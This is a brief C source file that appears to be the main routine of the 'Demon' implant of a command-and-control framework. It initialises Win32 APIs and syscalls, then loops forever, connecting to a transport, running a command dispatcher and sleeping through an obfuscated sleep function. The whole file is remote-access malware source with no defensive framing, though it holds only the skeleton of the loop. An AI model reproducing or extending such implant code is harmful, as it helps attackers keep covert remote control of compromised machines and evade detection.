#include <Demon.h>
#include <Core/Transport.h>
#include <Core/SleepObf.h>

PINSTANCE Instance = & ( ( PINSTANCE ) { 0 } );

_Noreturn VOID DemonMain( PVOID ModuleInst )
{
    PUTS( "Start" )

    Instance->Session.ModuleBase = ModuleInst;

    // Initialize Win32 api, Syscalls, Basic user data.
    if ( Instance->Session.DemonID == 0 )
        DxInitialization();

    // Our main loop.
    do
    {
        if ( ! Instance->Session.Connected )
        {
            if ( TransportInit( NULL ) )
                CommandDispatcher();
        }

        DxSleep( Instance->Config.Sleeping * 1000 );
    } while ( TRUE );
}